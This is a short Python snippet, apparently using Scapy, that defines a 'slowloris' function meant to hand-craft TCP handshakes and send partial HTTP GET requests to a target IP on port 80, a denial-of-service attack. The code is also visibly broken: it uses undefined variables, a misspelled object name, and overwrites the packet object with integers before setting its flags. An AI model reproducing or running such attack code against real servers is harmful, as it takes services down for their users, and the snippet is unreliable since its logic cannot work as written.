...
def slowloris(target_ip, tcp_connection_amount):
    for port_num in range(4000, tcp_connection_amount):
        tcp_connection = TCP()
        tcp_connection.dport = 80
        tcp_connection_connection.sport = port_num
        tcp_connection.flags = "S"
        ans = sr1(i/t, verbose=0)
        tcp_connection = ans.ack
        tcp_connection = ans.seq + 1
        tcp_connection.flags = "A"
        get = "GET / HTTP/1.1\r\nHost: " + target_ip
        ans = sr1(i/t/get, verbose=0)
